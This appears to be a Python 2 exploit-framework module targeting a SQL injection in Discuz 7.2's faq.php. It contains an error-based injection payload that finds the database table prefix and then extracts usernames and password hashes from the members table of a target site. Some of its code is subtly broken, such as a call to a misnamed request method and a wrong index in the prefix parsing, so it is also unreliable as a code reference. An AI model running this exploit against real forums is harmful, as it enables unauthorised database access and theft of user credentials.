#coding=utf-8
import re
import requests
import urllib
import urllib2
from libs.exploit_core import ExploitCore
from libs.exploit_http import EXPHttp

class SafecatExploit(ExploitCore):
	'''初始化info参数'''
	def __init__(self):
		self.info = {
			'Name':'faq.php文件SQL注入漏洞',
			'Description':'Discuz 7.2的faq.php文件存在SQL注入漏洞',
			'Author':['Exploit'],
			'Product':'Discuz!',
			'Reference':[
				['Sebug','87114'],
				['URL','http://sebug.net/vuldb/ssvid-87114']
			],    #漏洞信息
			'DisclosureDate':'2014-07-02',  #发布时间
			#攻击代码
			'Payload':{
				'get_table_pre':"action=grouppermission&gids[99]='&gids[100][0]=) and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x  )a)%23"
			},
			'Platform':['php','mysql'],
			'Targets':['Discuz 7.2']
		}

	'''发送请求'''
	def __send_request(self,url,para):
		try:
			if url.startswith("http://"):
				pass
			else:
				url = 'http://%s' % url
			print 'send request:',url
			data = urllib.quote(para,"?@`[]*,+()/'&=!_%")
			url_final = "%s?%s" % (url,data)
			res = urllib2.urlopen(url_final,timeout=5).read()
		except Exception, e:
			print 'Exploit Failed:%s' % str(e)
			return None
		return res

	'''获取discuz数据库中表的前缀'''
	def __get_table_pre(self,url):
		para = self.info['Payload']['get_table_pre']
		page_content = self.__send_request(url,para)
		if not page_content:
			return None
		pattern = re.compile(r"Duplicate entry '[0,1]?(.*?)[0,1]?'")
		infos = pattern.findall(page_content)
		if not infos:
			return None
		if infos[0].count('[Table]') != 0:
			#默认的表前缀
			return 'cdb'
		elif infos[0].count('_') != 0:
			#非默认表前缀
			return infos[0][0:infos.index("_")]
		else:
			return None

	'''
		1.参数必填为url（有且只有一个）
		2.返回值有严格要求：
			成功返回信息（str），
			失败返回None
	'''
	def exploit(self,url,count=0):
		self.initialize()
		httptools = EXPHttp()
		url = httptools.get_standard_url(url)
		#拼接漏洞文件
		if url[-1] != '/':
			url = url + '/faq.php'
		elif url[-1] == '/':
			url = url + 'faq.php'
		else:
			pass

		table_pre = self.__get_table_pre(url)
		if not table_pre:
			return None
		para = "action=grouppermission&gids[99]='&gids[100][0]=) and (select 1 from (select count(*),concat((select concat(username,0x20,password) from {table_pre}_members limit {start},1),floor(rand(0)*2))x from information_schema.tables group by x  )a)%23".format(table_pre=table_pre,start=count)
		page_content = self.send_request(url,para)
		if not page_content:
			return None
		pattern = re.compile(r"Duplicate entry '[0,1]?(.*?)[0,1]?'")
		infos = pattern.findall(page_content)
		if infos == []:
			print 'Exploit Failed'
			return None
		else:
			return infos[0].split(' ')

